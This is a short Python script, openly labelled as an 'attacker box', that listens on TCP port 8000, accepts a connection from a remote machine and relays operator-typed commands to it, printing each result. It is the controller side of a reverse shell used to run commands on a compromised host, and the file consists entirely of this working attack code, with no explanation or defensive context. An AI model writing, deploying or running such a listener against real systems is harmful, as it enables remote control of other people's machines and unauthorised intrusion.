import socket

server_port = 8000

server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_sock.bind(('', server_port))
server_sock.listen(1)
print('Attacker box listening and awaiting instructions')
connection_sock, addr = server_sock.accept()
print((connection_sock.recv(4064)).decode())
print('Thanks for connecting to me ' + str(addr))
command = ''
while command != 'exit':
    command = input('[*] Enter command: ')
    connection_sock.send(command.encode())
    result = (connection_sock.recv(4064)).decode()
    print(result)

connection_sock.shutdown(socket.SHUT_RDWR)
connection_sock.close()

